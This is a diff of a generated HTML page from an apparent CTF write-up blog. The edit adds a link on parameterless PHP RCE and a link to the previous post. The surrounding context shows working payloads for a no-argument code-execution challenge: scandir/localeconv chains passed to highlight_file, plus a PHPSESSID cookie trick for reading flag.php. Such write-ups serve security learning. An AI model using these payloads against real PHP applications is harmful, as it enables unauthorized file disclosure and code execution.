@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      458 字
+      465 字
     </span>
   
 
@@ -257,6 +257,7 @@ if(isset($_GET[&#39;exp&#39;]))&#123;
 <h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code><img src="https://sc01.alicdn.com/kf/H2d0db781d3f84faaa4dea78920f250dda.jpg" srcset="/img/loading.gif" alt="03.png">    </p>
 <hr>
 <p>解法二<br><code>arry_flip()</code>函数，交换数组的键和值<br><code>arry_rand()</code>函数，从数组中随机取出一个或多个单元<br>payload：<code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code><br>解法三<br>使用session<br><code>session_start()</code>开启<br><code>session_id()</code>获取当前的session id<br>需要手动设置<code>Cookie: PHPSESSID=flag.php</code><br><img src="https://ae02.alicdn.com/kf/Hf6e429eef7934a1b919a3e129bed795ec.jpg" srcset="/img/loading.gif" alt="05.png">        </p>
+<p>###知识点<br><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">无参数RCE</a>  </p>
 
             </div>
             <hr>
@@ -279,6 +280,12 @@ if(isset($_GET[&#39;exp&#39;]))&#123;
                 <div class="post-prevnext row">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2021/02/17/hgameweek2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hgameweek2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
